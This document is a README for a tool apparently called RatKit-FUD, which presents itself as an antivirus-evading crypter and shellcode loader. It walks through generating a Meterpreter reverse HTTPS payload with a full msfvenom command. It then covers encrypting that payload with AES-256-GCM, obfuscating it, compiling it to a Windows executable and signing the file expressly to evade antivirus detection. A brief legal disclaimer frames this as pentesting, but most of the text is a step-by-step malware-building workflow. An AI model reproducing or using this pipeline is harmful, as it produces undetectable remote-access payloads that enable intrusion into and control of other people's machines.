
# **RatKit-FUD**

**85% FUD Crypter, Shellcode Loader, and Obfuscation Tool**  
For authorized penetration testing and educational purposes only.

---

## **⚖️ Legal Disclaimer**

This tool is intended for **ethical security testing** (pentesting), training, and analysis purposes only.  
Any **unauthorized use on systems or networks** is illegal and can have serious legal consequences.  
By using this tool, you accept full responsibility for your actions.  
Any malicious use, damage, or unauthorized activity is considered a crime.

---


### **Dependencies:**

#### **Python 3.x**

Install the required Python packages:

```bash
pip install -r requirements.txt
```

- **PyQt5** (For the GUI)
- **pycryptodome** (For AES encryption)

---

## **🚀 Usage Steps**

### **1. Generate Payload**

Use **msfvenom** to generate the payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=4444 -e x64/xor -i 3000 -f hex
```

This command will generate a **Meterpreter reverse HTTPS** payload in **hexadecimal format**. Copy the output.

---

### **2. Encrypt with Crypter**

Paste the generated **shellcode** into **crypter.py** and encrypt it.  
The crypter will export the encrypted payload in **C++ format**.

```bash
python crypter.py
```
<img width="893" height="711" alt="resim" src="https://github.com/user-attachments/assets/42c633b7-0816-4821-bf27-afd3a1db1128" />

This step will:

- Apply **AES-256-GCM** encryption.
- Export **key**, **nonce**, **ciphertext**, and **tag** in C++ format.

---
<img width="480" height="324" alt="resim" src="https://github.com/user-attachments/assets/d7c16e63-e399-450c-8275-1b52d84eda06" />

### **3. Obfuscation (Optional)**

To obfuscate the payload and make it harder to analyze, run **obfuscation.py**.  
If you do not want to obfuscate, you can skip this step.

```bash
python obfuscation.py
```

---
<img width="578" height="396" alt="resim" src="https://github.com/user-attachments/assets/b1eadb10-448c-4a01-a7e7-02bc2787d3dc" />

### **4. Compile with MinGW32**

Compile the C++ file using **compiler.sh**.  
This script uses **MinGW32** (mingw32-g++) for compilation. Here’s an updated version of **compiler.sh** for **MinGW32** compatibility:

```bash
chmod +x compiler.sh
./compiler.sh
```

**Note:** Make sure you have the necessary tools installed on your system to meet the script's dependencies.

---
<img width="476" height="366" alt="resim" src="https://github.com/user-attachments/assets/046ac01e-7cf2-4ec7-a816-15b9e3a3ad17" />

### **5. Sign (Optional)**

To bypass AVs (Antivirus), use **signer.py** to digitally sign the generated **.exe** file.

```bash
python signer.py
```

Signing the file will help it evade detection by antivirus programs.

---

## **📌 Example Flow**

1. **Generate Payload:** Use **msfvenom** to create the payload.
2. **Encrypt:** Encrypt the payload with **crypter.py**.
3. **Obfuscation (Optional):** Obfuscate the payload with **obfuscation.py**.
4. **Compile (MinGW32):** Use **compiler.sh** to compile the **.exe** file.
5. **Sign (Optional):** Digitally sign the **.exe** file with **signer.py**.

---

